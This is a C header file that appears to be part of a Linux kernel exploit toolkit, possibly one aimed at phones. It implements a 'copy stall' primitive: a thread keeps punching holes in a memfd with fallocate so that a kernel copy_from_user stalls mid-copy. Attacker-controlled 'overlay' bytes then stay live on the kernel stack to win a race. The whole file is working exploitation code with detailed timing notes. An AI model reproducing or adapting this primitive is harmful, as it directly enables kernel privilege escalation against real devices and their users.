/* lib/rtmutex/copy_stall.h -- stall a kernel copy so controlled bytes stay live
 * on the kernel stack across an asynchronous read of them.
 *
 * A syscall that copies a fixed-size buffer onto its stack and then returns
 * leaves those bytes exposed for only an instant. Anything that reads the same
 * stack region afterwards -- on another CPU, or later on the same one -- usually
 * finds it stale or half-written. Widening that window turns a tight race into
 * a reliable read.
 *
 * The primitive is a memfd whose trailing pages a sibling thread continuously
 * cycles between present (fallocate) and punched (fallocate(PUNCH_HOLE)). A copy
 * that touches a page mid-teardown stalls there; the copy is then blocked in
 * progress, holding everything it has already written live on the in-use kernel
 * stack, for as long as the caller needs.
 *
 * Two ways to use the mapping, both against the same puncher:
 *   - SOURCE straddle: place the copy's source buffer across the boundary at
 *     map+page_size with buffer() so the leading (present) page holds the bytes
 *     that must survive and the tail falls in the punched page. copy_from_user
 *     writes the leading part, then stalls. arm_window() lines the syscall up
 *     with a punch, and lead_len() gives the prefix a caller may compose in.
 *   - TARGET page: hand the syscall map+page_size as a destination/scratch it
 *     will touch; it stalls when it reaches the punched page. The caller reads
 *     `map` and `page_size` directly.
 *
 * WHAT MAY RUN BETWEEN arm_window() AND THE SYSCALL: nothing that touches the
 * punched page, and nothing that costs longer than a punch. A userspace store
 * into the tail faults exactly the way the kernel copy does -- it waits out the
 * punch and then instantiates a fresh page -- so it cancels the arming and the
 * syscall that follows finds the tail present and never stalls. Compose the
 * source (lead_len() bytes) and make any warm-up call BEFORE arming; after
 * arming, issue the syscall.
 *
 * HOW WIDE THE WINDOW IS: a stalled fault waits on a wait queue the punch owns.
 * shmem_fallocate's punch path stores a descriptor for that queue, calls
 * unmap_mapping_range() and shmem_truncate_range() to tear the range down, then
 * clears the descriptor and wakes the queue as its last act before returning.
 * So the stall lasts the punch call's own teardown of the punched range and no
 * longer: it scales with map_len, and nothing that happens after fallocate()
 * returns can extend it.
 *
 * Lifecycle: setup() once, arm_window() before each stalling syscall,
 * teardown() at the end. setup() returning non-zero means no memfd/mapping was
 * made and the caller should fall back to an unstalled buffer.
 */
#ifndef LIB_RTMUTEX_COPY_STALL_H
#define LIB_RTMUTEX_COPY_STALL_H

#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stddef.h>
#include <string.h>
#include <unistd.h>
#include <linux/falloc.h>
#include <sys/mman.h>
#include <sys/syscall.h>

#ifndef LIB_COPY_STALL_LEN
#define LIB_COPY_STALL_LEN (512 * 1024)   /* small: fast fill/punch cycles */
#endif

struct lib_copy_stall {
  int fd;
  unsigned char *map;
  size_t map_len;
  size_t page_size;
  long arm_spin_cap;
  /* Microseconds the puncher waits, after the punch call returns, before
   * refilling the tail. It governs the duty cycle only: how much of each
   * period the tail is absent, and so how long arm_window() waits for the next
   * rising edge. It does not lengthen a stall -- by the time this sleep starts
   * the punch has already woken every faulting task (see the file header). The
   * lever on stall width is map_len. 0 refills immediately. */
  long punch_hold_us;
  /* Free-running (0, the default) cycles fill/punch continuously, so a window
   * is always moments away and arm_window() rarely waits. That costs a fill of
   * the whole region every cycle whether or not anyone is about to fire, which
   * on a large region is a continuous allocation load the rest of the system
   * pays for -- enough, on a memory-tight phone, to take the machine down
   * before the caller reaches its first armed attempt.
   *
   * One-shot (1) makes the puncher do nothing until arm_window() asks for a
   * cycle, so the load is one fill per window instead of one per period. The
   * window is the same width either way; only the idle cost differs. */
  int oneshot;
  atomic_int want;
  atomic_int go;
  atomic_int stop;
  atomic_int phase;
  pthread_t thread;
  int running;
};

static inline void *lib_copy_stall_thread(void *arg) {
  struct lib_copy_stall *s = arg;
  while (!atomic_load(&s->go) && !atomic_load(&s->stop)) {
    sched_yield();
  }
  while (!atomic_load(&s->stop)) {
    if (s->oneshot) {
      /* Nothing present, nothing punched, nothing allocated: wait to be asked.
       * The request is consumed here so one arm_window() buys one cycle. */
      while (!atomic_exchange(&s->want, 0) && !atomic_load(&s->stop)) {
        sched_yield();
      }
      if (atomic_load(&s->stop)) {
        break;
      }
    }
    if (fallocate(s->fd, 0, 0, (off_t)s->map_len) != 0) {
      break;
    }
    atomic_store(&s->phase, 1);
    fallocate(s->fd, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
              (off_t)s->page_size, (off_t)(s->map_len - s->page_size));
    atomic_store(&s->phase, 0);
    /* Hold the tail torn down so a stalled copy_from_user -- and the forged
     * overlay it has already written to the kernel slot -- persists long enough
     * for the walk to read it. Bail the hold early on stop. */
    for (long held = 0; held < s->punch_hold_us && !atomic_load(&s->stop);
         held += 100) {
      usleep(100);
    }
  }
  return NULL;
}

/* Create the memfd, map it, fault every page in, and start the punch thread.
 * `map_len` is the mapping size (0 for LIB_COPY_STALL_LEN); a smaller region
 * cycles present/punched faster. Returns 0 on success; on failure the struct's
 * map stays MAP_FAILED and the caller falls back to a plain stack buffer. */
static inline int lib_copy_stall_setup(struct lib_copy_stall *s, size_t map_len) {
  memset(s, 0, sizeof(*s));
  s->fd = -1;
  s->map = MAP_FAILED;
  s->map_len = map_len ? map_len : LIB_COPY_STALL_LEN;
  s->page_size = (size_t)sysconf(_SC_PAGESIZE);
  /* arm_window() spins waiting for the puncher's next fallocate-fill to
   * finish (phase 0 -> 1). That fill covers the whole mapping, so its
   * duration scales with map_len; the spin cap -- a timeout, exited early on
   * the rising edge -- must scale with it too, or a large region's punch
   * begins after the cap and arm_window returns before the page is torn
   * down, leaving the copy un-stalled. ~4096 spins per mapping page gives
   * generous headroom at any size without ever slowing a small region (which
   * reaches phase 1 and returns long before the cap). */
  s->arm_spin_cap = (long)(s->map_len / s->page_size) * 4096;
  s->fd = (int)syscall(SYS_memfd_create, "copy-stall", MFD_CLOEXEC);
  if (s->fd < 0 || fallocate(s->fd, 0, 0, (off_t)s->map_len) != 0) {
    return -1;
  }
  s->map = mmap(NULL, s->map_len, PROT_READ | PROT_WRITE, MAP_SHARED, s->fd, 0);
  if (s->map == MAP_FAILED) {
    return -1;
  }
  for (size_t off = 0; off < s->map_len; off += s->page_size) {
    s->map[off] = 0x55;
  }
  atomic_store(&s->stop, 0);
  atomic_store(&s->phase, 0);
  atomic_store(&s->want, 0);
  atomic_store(&s->go, 0);
  if (pthread_create(&s->thread, NULL, lib_copy_stall_thread, s) != 0) {
    return -1;
  }
  s->running = 1;
  atomic_store(&s->go, 1);
  return 0;
}

/* Set the puncher dwell (see struct field). Safe to call after setup. */
static inline void lib_copy_stall_set_punch_hold(struct lib_copy_stall *s,
                                                 long usec) {
  s->punch_hold_us = usec < 0 ? 0 : usec;
}

/* Select one-shot punching (see struct field). Safe to call after setup, and
 * before the first arm_window(). */
static inline void lib_copy_stall_set_oneshot(struct lib_copy_stall *s, int on) {
  s->oneshot = on ? 1 : 0;
}

static inline int lib_copy_stall_active(const struct lib_copy_stall *s) {
  return s->running && s->map != MAP_FAILED;
}

/* A buffer of `buflen` bytes straddling the page boundary at map+page_size:
 * `tail` bytes fall in the punched trailing page, the rest -- which must
 * include the whole overlay -- in the present leading page. */
static inline unsigned char *lib_copy_stall_buffer(struct lib_copy_stall *s,
                                                   size_t buflen, size_t tail) {
  return s->map + s->page_size - (buflen - tail);
}

/* How many leading bytes of that buffer lie in the present page -- the prefix
 * userspace may compose into. Writing past it faults on the punched page and
 * cancels an arming (see the file header). */
static inline size_t lib_copy_stall_lead_len(struct lib_copy_stall *s,
                                             size_t buflen, size_t tail) {
  (void)s;
  return buflen - tail;
}

/* Line the copying syscall up with a punch: wait for the current punch to
 * finish (the leading page, holding the overlay, is present), then for the next
 * punch to begin, so copy_from_user reaches the tail page mid-teardown. */
static inline void lib_copy_stall_arm_window(struct lib_copy_stall *s) {
  while (atomic_load(&s->phase)) {
    sched_yield();
  }
  if (s->oneshot) {
    atomic_store(&s->want, 1);
  }
  for (long spin = 0; !atomic_load(&s->phase) && spin < s->arm_spin_cap;
       spin++) {
    __asm__ volatile("yield" ::: "memory");
  }
}

static inline void lib_copy_stall_teardown(struct lib_copy_stall *s) {
  if (s->running) {
    atomic_store(&s->stop, 1);
    pthread_join(s->thread, NULL);
    s->running = 0;
  }
  if (s->map != MAP_FAILED) {
    munmap(s->map, s->map_len);
    s->map = MAP_FAILED;
  }
  if (s->fd >= 0) {
    close(s->fd);
    s->fd = -1;
  }
}

#endif /* LIB_RTMUTEX_COPY_STALL_H */
